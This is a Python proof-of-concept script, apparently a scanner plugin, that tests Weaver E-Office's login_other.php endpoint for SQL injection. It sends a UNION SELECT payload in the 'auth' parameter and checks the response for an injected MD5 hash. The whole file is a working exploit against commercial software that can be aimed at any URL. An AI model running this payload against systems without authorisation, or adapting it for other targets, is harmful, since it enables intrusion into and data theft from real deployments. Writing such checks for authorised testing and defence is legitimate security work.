import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Office系统login_other.php存在sql注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, '''/E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"-1' UNION SELECT 1,2,md5(123456),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23"}]}''')
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'e10adc3949' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult